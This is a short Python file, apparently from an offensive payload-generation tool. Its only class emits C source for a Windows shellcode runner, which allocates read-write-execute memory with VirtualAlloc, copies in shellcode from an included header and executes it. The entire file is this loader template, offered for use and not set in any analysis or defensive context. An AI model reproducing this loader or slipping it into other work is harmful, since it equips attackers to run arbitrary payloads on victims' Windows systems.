import textwrap
from dataclasses import dataclass

@dataclass
class main_c:
    shellcode_size: int
    def generate(self):
        template = textwrap.dedent(f"""\
        #include <windows.h>
        #include "shellcode.h"

        int main(int argc, char *argv[]) {{
            size_t shellcode_size = {self.shellcode_size};
            void *exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            memcpy(exec, shellcode, shellcode_size);
            ((void(*)())exec)();
            return 0;
        }}
        """)
        return template




